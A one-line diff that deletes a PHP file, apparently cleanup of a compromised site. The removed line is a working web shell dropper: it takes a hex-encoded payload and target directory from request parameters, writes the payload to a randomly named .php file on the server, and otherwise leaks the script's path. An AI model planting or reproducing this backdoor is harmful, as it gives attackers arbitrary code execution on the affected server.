@@ -1,1 +1,0 @@
-<?php @set_time_limit(0);@ini_set("display_errors","0");ob_clean();$p=$_REQUEST[suibian1234];$d=$_REQUEST[A7A607];if(!isset($p)||$p==""){echo dirname(__FILE__);}else{$r=rand(10000,99999).".php";if(!isset($d)||$d==""){$d=$r;}else{$d=J($d).$r;}ob_clean();if($f=fopen($d,"wb")){if(fwrite($f,J($p))){echo $r;}fclose($f);}}exit;function J($s){return pack("H*",$s);}?>
